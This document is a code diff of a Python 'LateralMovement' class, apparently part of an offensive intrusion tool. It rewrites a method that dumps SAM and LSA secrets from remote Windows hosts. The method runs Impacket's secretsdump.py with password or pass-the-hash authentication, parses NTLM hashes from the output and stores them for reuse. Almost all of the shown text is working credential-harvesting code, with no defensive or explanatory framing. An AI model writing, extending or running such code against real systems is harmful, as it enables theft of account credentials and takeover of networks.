@@ -211,45 +211,87 @@ class LateralMovement:
                         ntlm_hash: str = None, domain: str = '') -> List[Dict]:
         """
         Dump SAM and LSA secrets from a remote system
-        Enhanced version with better error handling and credential extraction
+        Uses secretsdump.py as subprocess (most reliable method)
         
         Returns:
             List of discovered credentials
         """
+        import subprocess
+        import re
+        
         discovered = []
         
         try:
             logging.info(f"[*] Attempting to dump secrets from {target}")
             
-            # Establish connection
-            remote_ops = RemoteOperations(None, username, domain, password, ntlm_hash)
-            remote_ops.setRemoteHost(target)
+            # Build secretsdump.py command
+            cmd = ['secretsdump.py']
             
-            try:
-                remote_ops.connectSamr(domain)
-                
-                # Dump SAM
-                sam_hashes = SAMHashes(remote_ops)
-                sam_hashes.dump()
-                
-                # Parse SAM output and add to credential store
-                # This would normally require capturing the output
-                logging.info(f"[+] SAM secrets dumped from {target}")
-                
-            except Exception as e:
-                logging.error(f"[-] SAM dump failed: {str(e)}")
+            if ntlm_hash:
+                # Use hash authentication
+                if ':' not in ntlm_hash:
+                    ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"
+                cmd.extend(['-hashes', ntlm_hash])
+                target_string = f"{domain}/{username}@{target}"
+            else:
+                # Use password authentication
+                target_string = f"{domain}/{username}:{password}@{target}"
             
-            try:
-                # Dump LSA Secrets
-                lsa_secrets = LSASecrets(remote_ops)
-                lsa_secrets.dumpSecrets()
-                logging.info(f"[+] LSA secrets dumped from {target}")
+            cmd.append(target_string)
+            
+            # Add options for faster dumping (skip NTDS which is slow)
+            cmd.extend(['-outputfile', '/tmp/secretsdump_output'])
+            
+            logging.info(f"[*] Running secretsdump.py on {target}...")
+            
+            # Execute with timeout
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=120  # 2 minute timeout
+            )
+            
+            if result.returncode == 0 or 'dumped' in result.stdout.lower():
+                output = result.stdout
                 
-            except Exception as e:
-                logging.error(f"[-] LSA dump failed: {str(e)}")
-            
-            remote_ops.finish()
-            
+                # Parse NTLM hashes from output
+                # Format: DOMAIN\username:rid:lmhash:nthash:::
+                hash_pattern = re.compile(r'([^\\:]+)\\?([^:]+):\d+:[a-f0-9]{32}:([a-f0-9]{32}):::')
+                
+                for match in hash_pattern.finditer(output):
+                    found_domain = match.group(1) if match.group(1) else domain
+                    found_username = match.group(2)
+                    nt_hash = match.group(3)
+                    
+                    # Skip empty/disabled accounts
+                    if nt_hash == '31d6cfe0d16ae931b73c59d7e0c089c0':  # Empty password hash
+                        continue
+                    
+                    self.cred_store.add_credential(
+                        found_username,
+                        None,
+                        nt_hash,
+                        found_domain
+                    )
+                    
+                    discovered.append({
+                        'username': found_username,
+                        'ntlm_hash': nt_hash,
+                        'domain': found_domain
+                    })
+                    
+                    logging.info(f"[+] Found credential: {found_domain}\\{found_username}")
+                
+                logging.info(f"[+] Successfully dumped secrets from {target}")
+                logging.info(f"[+] Discovered {len(discovered)} new credentials")
+            else:
+                logging.error(f"[-] secretsdump.py failed: {result.stderr[:200]}")
+                
+        except subprocess.TimeoutExpired:
+            logging.error(f"[-] Dump timed out after 120 seconds")
+        except FileNotFoundError:
+            logging.error(f"[-] secretsdump.py not found. Install with: pip3 install impacket")
         except Exception as e:
             logging.error(f"[-] Remote operations failed on {target}: {str(e)}")
         
